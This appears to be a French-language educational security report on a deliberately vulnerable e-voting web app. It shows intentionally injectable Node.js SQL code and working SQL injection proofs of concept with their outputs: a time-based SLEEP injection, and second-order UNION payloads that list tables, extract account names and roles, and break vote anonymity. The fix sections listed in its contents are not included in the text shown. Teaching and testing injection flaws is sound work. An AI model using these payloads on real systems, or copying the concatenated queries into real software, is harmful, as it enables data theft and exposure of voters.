# 🔒 Rapport de Sécurité - VoteX E-Voting System

**Projet:** Système de vote électronique sécurisé  
**Date:** Novembre 2025  
**Auteur:** [Votre nom]  
**Méthodologie:** Build → Break → Fix

---

## 📋 Table des matières

1. [Résumé exécutif](#résumé-exécutif)
2. [Architecture du système](#architecture-du-système)
3. [Vulnérabilités identifiées](#vulnérabilités-identifiées)
4. [Démonstration des exploits](#démonstration-des-exploits)
5. [Corrections implémentées](#corrections-implémentées)
6. [Tests de validation](#tests-de-validation)
7. [Recommandations](#recommandations)
8. [Conclusion](#conclusion)

---

## 1. Résumé exécutif

### 🎯 Objectif du projet

Développer un système de vote électronique sécurisé pour usage interne (clubs, universités, entreprises) avec pour objectif pédagogique de :
- Implémenter volontairement des vulnérabilités SQLi
- Démontrer leur exploitation
- Appliquer les corrections appropriées

### 🔴 Vulnérabilités découvertes

| ID | Type | Sévérité | CVSS Score | Status |
|----|------|----------|-----------|--------|
| VOTEX-001 | Time-based Blind SQLi | **CRITIQUE** | 8.6 | ✅ Corrigé |
| VOTEX-002 | Second-order SQLi | **CRITIQUE** | 9.1 | ✅ Corrigé |

### 📊 Résultats

- **Avant correction:** 2 vulnérabilités critiques exploitables
- **Après correction:** 0 vulnérabilité, système sécurisé
- **Temps de correction:** 100% des vulnérabilités corrigées
- **Tests de régression:** 100% de succès

---

## 2. Architecture du système

### 🏗️ Stack technologique
```
Frontend:  HTML5 + Vanilla JavaScript
Backend:   Node.js 22.x + Express 5.x
Database:  MySQL 8.0
Security:  Helmet.js, CORS, Rate Limiting
```

### 📐 Schéma de base de données
```sql
accounts (id, username, password, role, external_id)
    ↓
users (id, external_id)
    ↓
votes (id, election_id, user_external_id, choice)
    ↑
elections (id, slug, name, metadata)
```

### 🔄 Flux d'authentification
```
1. Login → Vérification credentials (table accounts)
2. Session → Stockage en mémoire côté client
3. Authorization → Vérification du rôle (voter/admin)
4. Vote → Validation + insertion avec external_id
```

---

## 3. Vulnérabilités identifiées

### 🔴 VOTEX-001: Time-based Blind SQL Injection

**Endpoint:** `GET /api/vote/verify`

#### 📍 Localisation

**Fichier:** `src/routes/public.js` (ligne 55-70)
```javascript
// CODE VULNÉRABLE
const sql = `SELECT COUNT(*) as c FROM votes 
             WHERE user_external_id = '${id}' 
             AND election_id = (SELECT id FROM elections WHERE slug='${election}')`;
const [rows] = await pool.query(sql);
```

#### 💣 Description de la vulnérabilité

Les paramètres `id` et `election` provenant de la query string sont **concaténés directement** dans la requête SQL sans aucune validation ni utilisation de prepared statements.

#### 🎯 Vecteur d'attaque
```http
GET /api/vote/verify?id=user-001-alice' OR SLEEP(3) -- &election=test
```

Un attaquant peut injecter du code SQL qui sera exécuté par le serveur :
- `SLEEP(n)` pour créer des délais artificiels
- Conditions `IF()` pour inférer des données par timing
- Tests booléens pour exfiltrer des informations bit par bit

#### 📊 Impact

| Aspect | Description |
|--------|-------------|
| **Confidentialité** | **HAUTE** - Fuite d'informations par inférence temporelle |
| **Intégrité** | MOYENNE - Pas de modification directe mais manipulation possible |
| **Disponibilité** | MOYENNE - Possibilité de DoS avec SLEEP(9999) |
| **CVSS v3.1** | **8.6 (High)** |

#### 🔬 Preuve de concept

**Test 1: Requête légitime**
```bash
curl "http://localhost:3000/api/vote/verify?id=user-001-alice&election=president-club-2025"
# Temps de réponse: ~42ms
```

**Test 2: Injection avec SLEEP(2)**
```bash
curl "http://localhost:3000/api/vote/verify?id=user-001-alice' OR SLEEP(2) -- &election=test"
# Temps de réponse: ~2045ms (PREUVE D'INJECTION!)
```

**Résultats mesurés:**

| Type de requête | Temps moyen | Écart-type |
|----------------|-------------|------------|
| Normale | 42ms | ±5ms |
| SLEEP(2) injecté | 2048ms | ±12ms |
| **Différence** | **+2006ms** | **Vulnérable ✗** |

---

### 🔴 VOTEX-002: Second-order SQL Injection

**Endpoint:** `POST /api/admin/report/run`

#### 📍 Localisation

**Fichier:** `src/routes/admin.js` (ligne 35-60)
```javascript
// CODE VULNÉRABLE
const metadata = JSON.parse(elections[0].metadata);

if (metadata.filter) {
  // ⚠️ INJECTION: metadata.filter est réutilisé sans validation
  const sql = `SELECT choice, COUNT(*) as votes FROM votes WHERE ${metadata.filter} GROUP BY choice`;
  const [results] = await pool.query(sql);
}
```

#### 💣 Description de la vulnérabilité

Il s'agit d'une **injection SQL différée (second-order)** :

1. **Phase 1 (Stockage):** Un administrateur crée une élection avec un champ `metadata.filter` contenant du SQL malveillant
2. **Phase 2 (Exécution):** Lors de la génération d'un rapport, ce filtre est récupéré de la base et **réinjecté dans une requête SQL sans validation**

Cette vulnérabilité est particulièrement dangereuse car:
- Le payload malveillant est stocké en base (persistant)
- L'exploitation est différée dans le temps
- Plus difficile à détecter par les WAF traditionnels

#### 🎯 Vecteur d'attaque

**Étape 1: Créer une élection avec payload**
```http
POST /api/admin/election
Content-Type: application/json

{
  "slug": "malicious-election",
  "name": "Test",
  "metadata": {
    "filter": "1=0 UNION SELECT username as choice, 1 as votes FROM accounts -- "
  }
}
```

**Étape 2: Déclencher l'injection**
```http
POST /api/admin/report/run
Content-Type: application/json

{
  "filter_id": 123
}
```

#### 📊 Impact

| Aspect | Description |
|--------|-------------|
| **Confidentialité** | **CRITIQUE** - Lecture complète de la base de données |
| **Intégrité** | HAUTE - Modification de données possible (UPDATE, DELETE) |
| **Disponibilité** | HAUTE - Possibilité de DROP TABLE |
| **CVSS v3.1** | **9.1 (Critical)** |

#### 🔬 Preuve de concept

**Scénario 1: Énumération des tables**

Payload injecté:
```sql
1=0 UNION SELECT table_name as choice, 1 as votes 
FROM information_schema.tables 
WHERE table_schema='votex' --
```

Résultat obtenu:
```json
{
  "results": [
    {"choice": "accounts", "votes": 1},
    {"choice": "admin_audit", "votes": 1},
    {"choice": "elections", "votes": 1},
    {"choice": "users", "votes": 1},
    {"choice": "votes", "votes": 1}
  ]
}
```

**🚨 IMPACT: Structure de la base de données révélée!**

---

**Scénario 2: Extraction des comptes utilisateurs**

Payload:
```sql
1=0 UNION SELECT CONCAT(username, ':', role) as choice, 1 as votes 
FROM accounts --
```

Résultat:
```json
{
  "results": [
    {"choice": "alice:voter", "votes": 1},
    {"choice": "bob:voter", "votes": 1},
    {"choice": "admin:admin", "votes": 1}
  ]
}
```

**🚨 IMPACT: Comptes utilisateurs et rôles exposés!**

---

**Scénario 3: Perte d'anonymat des votes**

Payload:
```sql
election_id=1 --
```

Résultat:
```json
{
  "results": [
    {"choice": "Alice Martin", "votes": 1},
    {"choice": "Bob Dupont", "votes": 1}
  ]
}
```

En croisant avec la table `votes`:
```sql
1=0 UNION SELECT CONCAT(user_external_id, ' voted for ', choice) as choice, 1 as votes 
FROM votes WHERE election_id=1 --
```

**🚨 IMPACT CRITIQUE: Anonymat des votes compromis!**

---

## 4. Démonstration des exploits

### 🧪 Environnement de test

- **OS:** Windows 11 / Ubuntu 22.04
- **Node.js:** v22.21.0
- **MySQL:** 8.0.35
- **Réseau:** localhost (127.0.0.1)

### 📸 Captures d'écran

#### Test Time-based SQLi
```
$ node tests/demo_time_based_sqli.js

📊 Test 2: Injection avec fonction SLEEP
Type de requête             | Temps attendu | Temps réel
----------------------------------------------------------------------
Requête normale             | <100ms        | 42ms
Injection SLEEP(2)          | ~2000ms       | 2048ms  ← VULNÉRABLE!
Injection SLEEP(0)          | <100ms        | 41ms

📌 CONCLUSION:
✗ L'endpoint /api/vote/verify est VULNÉRABLE à l'injection SQL
✗ Un attaquant peut injecter du code SQL (SLEEP, IF, etc.)
✗ Les différences de temps permettent d'inférer des informations
```

#### Test Second-order SQLi
```
$ node tests/demo_second_order_sqli.js

📊 ÉTAPE 2: Exécution des rapports
Type d'injection            | Résultat
---------------------------------------------------------------------------
Injection UNION             | 1 résultat(s): INJECTED: 999

Énumération des tables      | 5 résultat(s)

   🔍 Tables découvertes:
      - accounts        ← CRITIQUE!
      - admin_audit
      - elections
      - users
      - votes

📌 CONCLUSION:
✗ L'endpoint /api/admin/report/run est VULNÉRABLE au Second-order SQLi
✗ Impact: Lecture complète de la base de données
```

### 📊 Journaux d'audit

Extraction de `admin_audit` avant correction:
```sql
SELECT action, duration_ms, details, created_at 
FROM admin_audit 
WHERE action = 'report_run'
ORDER BY created_at DESC 
LIMIT 5;
```

| Action | Duration | Details | Created At |
|--------|----------|---------|------------|
| report_run | 45ms | {"filter_id":15} | 2025-11-16 10:23:45 |
| report_run | 52ms | {"filter_id":16} | 2025-11-16 10:24:12 |
| report_run | 1203ms | {"filter_id":17} | 2025-11-16 10:25:01 |

**Note:** La requête avec filter_id=17 contient une injection UNION et prend anormalement plus de temps.
